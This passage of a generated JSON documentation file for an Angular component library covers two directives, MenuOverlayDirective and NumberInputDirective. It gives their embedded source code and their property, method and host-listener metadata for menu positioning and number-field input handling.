        ]
      }
    },
    {
      "name": "MenuOverlayDirective",
      "id": "directive-MenuOverlayDirective-cafdee9b0fb51bfee1907404c0e445df4b79c10248b6876f232e6e8d0eabb742e4c0b57a5ac4738c243f62a3a9994ee3e6a97e9f0ee58b9bbb7dd43381593629",
      "file": "libs/core/src/lib/sto-directives/menu-overlay.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Directive, ElementRef, Host, HostBinding } from '@angular/core';\nimport { MatMenuPanel, MatMenuTrigger } from '@angular/material/menu';\nimport { fromEvent } from 'rxjs';\nimport { switchMap, take } from 'rxjs/operators';\n\n@Directive({\n  selector: '[stoMenuOverlay]',\n  exportAs: 'stoMenuOverlay'\n})\nexport class MenuOverlayDirective {\n  private readonly menu: MatMenuPanel;\n  @HostBinding('style.left.px')\n  left = 0;\n  @HostBinding('style.top.px')\n  top = 0;\n\n  constructor(@Host() private trigger: MatMenuTrigger, el: ElementRef<HTMLButtonElement>) {\n    this.menu = trigger.menu as MatMenuPanel;\n    this.trigger.menuOpened.pipe(\n      switchMap(() =>\n        fromEvent<MouseEvent>(document, 'click')\n          .pipe(take(1))\n      ),\n    ).subscribe(() => {\n      this.trigger.closeMenu();\n    });\n    this.setStyle(el.nativeElement);\n  }\n\n  public updatePosition(event: MouseEvent) {\n    this.left = event.x;\n    this.top = event.y;\n  }\n\n  private setStyle(element: HTMLButtonElement) {\n    element.style.overflow = 'hidden';\n    element.style.position = 'fixed';\n    element.style.height = '1px';\n    element.style.width = '1px';\n  }\n}\n",
      "selector": "[stoMenuOverlay]",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "style.left.px",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 13,
          "type": "number",
          "decorators": []
        },
        {
          "name": "style.top.px",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 15,
          "type": "number",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "propertiesClass": [
        {
          "name": "left",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 13,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'style.left.px'"
            }
          ]
        },
        {
          "name": "menu",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatMenuPanel",
          "optional": false,
          "description": "",
          "line": 11,
          "modifierKind": [
            121,
            144
          ]
        },
        {
          "name": "top",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 15,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'style.top.px'"
            }
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "setStyle",
          "args": [
            {
              "name": "element",
              "type": "HTMLButtonElement",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 35,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "element",
              "type": "HTMLButtonElement",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "updatePosition",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 30,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "trigger",
            "type": "MatMenuTrigger",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "el",
            "type": "ElementRef<HTMLButtonElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 15,
        "jsdoctags": [
          {
            "name": "trigger",
            "type": "MatMenuTrigger",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "el",
            "type": "ElementRef<HTMLButtonElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "NumberInputDirective",
      "id": "directive-NumberInputDirective-101a364812cd1dc785059ebf64eeeeca7262773cb59f81bc9a60b7c695afca49a76a474cb1cc0414800e3ee132a2d9bd99dcebe6d9a6a48b9abba5652fb7d25b",
      "file": "libs/form/src/lib/number-input/number-input.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Directive, ElementRef, HostListener, Input } from '@angular/core';\nimport { Key } from '@ngx-stoui/core';\nimport { NumberInputPipe } from './number-input.pipe';\n\n\n// eslint-disable-next-line @angular-eslint/directive-selector\n@Directive({ selector: '[numberInput]' })\nexport class NumberInputDirective {\n  @Input()\n  unit: string | undefined;\n  @Input()\n  appendUnit: boolean;\n\n  private _el: HTMLInputElement;\n\n  @Input()\n  fractionSize = 5;\n  @Input()\n  dynamicFractionSize: boolean;\n  /**\n   * List of keys ignored, to work as default.\n   *  {Key[]}\n   */\n  private ignoredKeys = [\n    Key.Dash,\n    Key.Backspace,\n    Key.Delete,\n    Key.Home,\n    Key.LeftArrow,\n    Key.RightArrow,\n    Key.End,\n    Key.Tab,\n    Key.Subtract\n  ];\n\n\n  constructor(private elementRef: ElementRef,\n              private numberFormatPipe: NumberInputPipe,\n  ) {\n    this._el = this.elementRef.nativeElement;\n  }\n\n  public setDisplayValue(readonly: boolean) {\n    const val = ( this._el.value || '' ).replace(` ${this.unit}`, '');\n    if ( this.unit ) {\n      if ( readonly ) {\n        this._el.value = val + ` ${this.unit}`;\n      } else {\n        this._el.value = val;\n      }\n    }\n  }\n\n  /**\n   * Listens for the paste events.\n   * Handles spaces, long dash, period and commas.\n   * Tries to the format, will be ignored if something fails.\n   * @param e event\n   * @param clipboardData\n   */\n  @HostListener('paste', [ '$event', '$event.clipboardData' ])\n  onPaste(e: Event, clipboardData: DataTransfer | null) {\n    if ( this._el.readOnly || this._el.disabled || !clipboardData ) {\n      return;\n    }\n    e.preventDefault();\n    let pasted = clipboardData.getData('text') || '';\n    pasted = pasted.replace('—', '-'); // long dash, sometime used in Excel and Word\n    pasted = this.handleMixedCommasAndDecimals(pasted);\n    let parsedValue = this.numberFormatPipe.parse(pasted, this.fractionSize, this.dynamicFractionSize);\n\n    if ( !this.hasInvalidValues(parsedValue) ) {\n\n      parsedValue = parsedValue.replace('.', ',');\n      this._el.value = parsedValue;\n      this._el.dispatchEvent(new Event('input'));\n    }\n  }\n\n  /**\n   *  Handles thousand seperator with commas\n   * @param orgStr eg. 123.214,123\n   * {string} 123214.123\n   */\n  private handleMixedCommasAndDecimals(orgStr: string) {\n    let str = orgStr + '';\n    str = str.replace(',', '.');\n    const array = str.split('.');\n    if ( array.length > 1 ) {\n      const prefix = array.slice(0, array.length - 1).join('');\n      str = prefix + '.' + array[ array.length - 1 ];\n    } else {\n      str = orgStr;\n    }\n    return str;\n  }\n\n\n  /**\n   * Se if parsed string contains words that indicate a failed parse.\n   * @param parsedValue\n   * {boolean}\n   */\n  private hasInvalidValues(parsedValue: string) {\n    return parsedValue.includes('NaN')\n      || parsedValue.includes('undefined')\n      || parsedValue.includes('null');\n  }\n\n  /**\n   * Listen for key event to work like a number field.\n   * Transforms period to comma.\n   * Handles hash, allows copy,pase,cut and select all.\n   * @param e\n   */\n  @HostListener('keydown', [ '$event' ])\n  onKeyPress(e: KeyboardEvent) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    if ( [ Key.Enter ].includes(e.which) ) {\n      this._el.blur();\n    }\n    if ( this.isNumberKeypress(e) ) {\n      // do nothing\n    } else if ( [ Key.Period, Key.Comma, Key.DecimalPoint ].includes(e.which) ) {\n      this.handlePeriodDelimiter(e);\n    } else if ( [ Key.Dash, Key.Subtract ].includes(e.which) ) {\n      this.handleDash(e);\n    } else if ( [ Key.UpArrow, Key.DownArrow ].includes(e.which) ) {\n      this.handleKeyUpAndDown(e);\n    } else if ( this.ignoredKeys.indexOf(e.which) !== -1 ) {\n    } else if ( this.isCopyPaste(e) || this.isCtrlA(e) ) {\n    } else {\n      e.preventDefault();\n    }\n  }\n\n  /**\n   * Handles dash. Is ignored if already exist a comma.\n   * Replaces period with comma.\n   * @param e\n   */\n  private handlePeriodDelimiter(e: KeyboardEvent) {\n    let selectionIncludesPeriod = false;\n    if (!e.target) {\n      return;\n    }\n    const target = e.target as HTMLInputElement;\n    if ( target.selectionStart !== target.selectionEnd && this._el.value && this._el.value.length > 0 ) {\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n      // @ts-ignore\n      const selection = this._el.value.substring(target.selectionStart, target.selectionEnd);\n      selectionIncludesPeriod = selection.includes(',');\n    }\n\n    if ( this._el.value.includes(',') && !selectionIncludesPeriod ) {\n      e.preventDefault();\n    } else if ( e.which === Key.Period ) {\n      setTimeout(() => {\n        const target = e.target as HTMLInputElement;\n        const caretPosition = target.selectionStart;\n        this._el.value = this._el.value.replace('.', ',');\n        this._el.setSelectionRange(caretPosition, caretPosition);\n\n      }, 0);\n    }\n  }\n\n  /**\n   * All text is selected in the input\n   * @param e\n   * {boolean}\n   */\n  private hasSelectedAllText(e: KeyboardEvent) {\n    const target = e.target as HTMLInputElement;\n    if (!target) {\n      return;\n    }\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    return target.selectionEnd - target.selectionStart === this._el.value.length;\n\n  }\n\n  /**\n   * Handles dashes. Should only be allowed in the beginning and only once.\n   * @param e\n   */\n  private handleDash(e: KeyboardEvent) {\n    if (!e.target) {\n      return;\n    }\n    if ( this.hasSelectedAllText(e) ) {\n    } else if ( !this._el.value.includes('-') && (e.target as HTMLInputElement).selectionStart === 0 ) {\n    } else {\n      e.preventDefault();\n    }\n  }\n\n  /**\n   * Is copy, paste or cut.\n   * @param e\n   * {boolean}\n   */\n  private isCopyPaste(e: KeyboardEvent) {\n    return ( e.ctrlKey || e.metaKey ) && ( e.which === Key.C || e.which === Key.V || e.which === Key.X );\n  }\n\n  /**\n   * Is select all text (CTRL+A)\n   * @param e\n   * {boolean}\n   */\n  private isCtrlA(e: KeyboardEvent) {\n    return ( e.ctrlKey || e.metaKey ) && ( e.which === Key.A );\n  }\n\n  /**\n   * Is a number, on keyboard and on numpad.\n   * @param e\n   * {boolean}\n   */\n  private isNumberKeypress(e: KeyboardEvent) {\n    return ( e.keyCode >= 48 && e.keyCode <= 57 ) || ( e.keyCode >= 96 && e.keyCode <= 105 );\n  }\n\n\n  /**\n   * Handles up and down arrows by adding/subtracting one\n   * @param e\n   */\n  private handleKeyUpAndDown(e: KeyboardEvent) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    const value = this._el.value;\n    const addition = e.which === Key.UpArrow ? 1 : -1;\n    // eslint-disable-next-line prefer-const\n    let [ integerSplit = '', fractionSplit = '' ] = ( value || '' ).split(',');\n    integerSplit = integerSplit.replace(' ', '');\n    if ( integerSplit.length === 0 ) {\n      integerSplit = '0';\n    }\n    const currentValue = parseInt(integerSplit, 10);\n\n    setTimeout(() => {\n      if ( fractionSplit.length > 0 ) {\n        this._el.value = ( ( currentValue + addition ) + ',' + fractionSplit );\n      } else {\n        this._el.value = ( currentValue + addition ) + '';\n      }\n      this._el.dispatchEvent(new Event('input'));\n    }, 0);\n\n  }\n\n  @HostListener('focus', [ '$event' ])\n  onFocus($event: FocusEvent) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    const target = $event.target as HTMLInputElement;\n    const value = target.value;\n    this._el.value = ( this.numberFormatPipe.parse(value, this.fractionSize, this.dynamicFractionSize) + '' ).replace('.', ',');\n    this._el.select();\n  }\n\n  @HostListener('blur', [ '$event.target.value' ])\n  onBlur(value: number) {\n    if ( this._el.readOnly || this._el.disabled ) {\n      return;\n    }\n    this._el.value = this.numberFormatPipe.transform(value, this.fractionSize, this.dynamicFractionSize);\n  }\n\n}\n",
      "selector": "[numberInput]",
      "providers": [],
      "inputsClass": [
        {
          "name": "appendUnit",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 13,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "dynamicFractionSize",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 20,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "fractionSize",
          "defaultValue": "5",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 18,
          "type": "number",
          "decorators": []
        },
        {
          "name": "unit",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 11,
          "type": "string | undefined",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "blur",
          "args": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event.target.value"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 271
        },
        {
          "name": "focus",
          "args": [
            {
              "name": "$event",
              "type": "FocusEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 260
        },
        {
          "name": "keydown",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.\n",
          "description": "<p>Listen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.</p>\n",
          "jsdoctags": [
            {
              "pos": 3080,
              "end": 3092,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 338,
              "tagName": {
                "pos": 3081,
                "end": 3086,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "name": {
                "pos": 3087,
                "end": 3088,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "isNameFirst": true,
              "isBracketed": false
            }
          ],
          "line": 118
        },
        {
          "name": "paste",
          "args": [
            {
              "name": "e",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "clipboardData",
              "type": "DataTransfer | null",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event",
            "$event.clipboardData"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.\n",
          "description": "<p>Listens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.</p>\n",
          "jsdoctags": [
            {
              "pos": 1371,
              "end": 1391,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 338,
              "tagName": {
                "pos": 1372,
                "end": 1377,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "<p>event</p>\n",
              "name": {
                "pos": 1378,
                "end": 1379,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "isNameFirst": true,
              "isBracketed": false
            },
            {
              "pos": 1391,
              "end": 1415,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 338,
              "tagName": {
                "pos": 1392,
                "end": 1397,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "name": {
                "pos": 1398,
                "end": 1411,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "clipboardData"
              },
              "isNameFirst": true,
              "isBracketed": false
            }
          ],
          "line": 63
        }
      ],
      "propertiesClass": [
        {
          "name": "_el",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HTMLInputElement",
          "optional": false,
          "description": "",
          "line": 15,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "ignoredKeys",
          "defaultValue": "[\n    Key.Dash,\n    Key.Backspace,\n    Key.Delete,\n    Key.Home,\n    Key.LeftArrow,\n    Key.RightArrow,\n    Key.End,\n    Key.Tab,\n    Key.Subtract\n  ]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "optional": false,
          "description": "<p>List of keys ignored, to work as default.\n {Key[]}</p>\n",
          "line": 25,
          "rawdescription": "\n\nList of keys ignored, to work as default.\n {Key[]}\n",
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "handleDash",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 191,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nHandles dashes. Should only be allowed in the beginning and only once.\n",
          "description": "<p>Handles dashes. Should only be allowed in the beginning and only once.</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 5409,
                "end": 5410,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 5403,
                "end": 5408,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "handleKeyUpAndDown",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 234,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nHandles up and down arrows by adding/subtracting one\n",
          "description": "<p>Handles up and down arrows by adding/subtracting one</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 6406,
                "end": 6407,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 6400,
                "end": 6405,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "handleMixedCommasAndDecimals",
          "args": [
            {
              "name": "orgStr",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 86,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n Handles thousand seperator with commas\n{string} 123214.123\n",
          "description": "<p> Handles thousand seperator with commas\n{string} 123214.123</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 2214,
                "end": 2220,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "orgStr"
              },
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 2208,
                "end": 2213,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "<p>eg. 123.214,123\n{string} 123214.123</p>\n"
            }
          ]
        },
        {
          "name": "handlePeriodDelimiter",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 145,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nHandles dash. Is ignored if already exist a comma.\nReplaces period with comma.\n",
          "description": "<p>Handles dash. Is ignored if already exist a comma.\nReplaces period with comma.</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 3963,
                "end": 3964,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 3957,
                "end": 3962,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "hasInvalidValues",
          "args": [
            {
              "name": "parsedValue",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 105,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nSe if parsed string contains words that indicate a failed parse.\n{boolean}\n",
          "description": "<p>Se if parsed string contains words that indicate a failed parse.\n{boolean}</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 2716,
                "end": 2727,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "parsedValue"
              },
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 2710,
                "end": 2715,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "typeExpression": {
                "pos": 2733,
                "end": 2742,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 307,
                "type": {
                  "pos": 2734,
                  "end": 2741,
                  "flags": 4194304,
                  "modifierFlagsCache": 0,
                  "transformFlags": 1,
                  "kind": 133
                }
              }
            }
          ]
        },
        {
          "name": "hasSelectedAllText",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "boolean",
          "typeParameters": [],
          "line": 176,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nAll text is selected in the input\n{boolean}\n",
          "description": "<p>All text is selected in the input\n{boolean}</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 4983,
                "end": 4984,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 4977,
                "end": 4982,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "typeExpression": {
                "pos": 4990,
                "end": 4999,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 307,
                "type": {
                  "pos": 4991,
                  "end": 4998,
                  "flags": 4194304,
                  "modifierFlagsCache": 0,
                  "transformFlags": 1,
                  "kind": 133
                }
              }
            }
          ]
        },
        {
          "name": "isCopyPaste",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "boolean",
          "typeParameters": [],
          "line": 207,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIs copy, paste or cut.\n{boolean}\n",
          "description": "<p>Is copy, paste or cut.\n{boolean}</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 5740,
                "end": 5741,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 5734,
                "end": 5739,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "typeExpression": {
                "pos": 5747,
                "end": 5756,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 307,
                "type": {
                  "pos": 5748,
                  "end": 5755,
                  "flags": 4194304,
                  "modifierFlagsCache": 0,
                  "transformFlags": 1,
                  "kind": 133
                }
              }
            }
          ]
        },
        {
          "name": "isCtrlA",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "boolean",
          "typeParameters": [],
          "line": 216,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIs select all text (CTRL+A)\n{boolean}\n",
          "description": "<p>Is select all text (CTRL+A)\n{boolean}</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 5967,
                "end": 5968,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 5961,
                "end": 5966,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "typeExpression": {
                "pos": 5974,
                "end": 5983,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 307,
                "type": {
                  "pos": 5975,
                  "end": 5982,
                  "flags": 4194304,
                  "modifierFlagsCache": 0,
                  "transformFlags": 1,
                  "kind": 133
                }
              }
            }
          ]
        },
        {
          "name": "isNumberKeypress",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "boolean",
          "typeParameters": [],
          "line": 225,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIs a number, on keyboard and on numpad.\n{boolean}\n",
          "description": "<p>Is a number, on keyboard and on numpad.\n{boolean}</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 6160,
                "end": 6161,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 6154,
                "end": 6159,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "typeExpression": {
                "pos": 6167,
                "end": 6176,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 307,
                "type": {
                  "pos": 6168,
                  "end": 6175,
                  "flags": 4194304,
                  "modifierFlagsCache": 0,
                  "transformFlags": 1,
                  "kind": 133
                }
              }
            }
          ]
        },
        {
          "name": "onBlur",
          "args": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 271,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'blur', ['$event.target.value']"
            }
          ],
          "jsdoctags": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onFocus",
          "args": [
            {
              "name": "$event",
              "type": "FocusEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 260,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'focus', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": "$event",
              "type": "FocusEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onKeyPress",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 118,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.\n",
          "description": "<p>Listen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.</p>\n",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'keydown', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 3087,
                "end": 3088,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 3081,
                "end": 3086,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "onPaste",
          "args": [
            {
              "name": "e",
              "type": "Event",
              "deprecated": false,
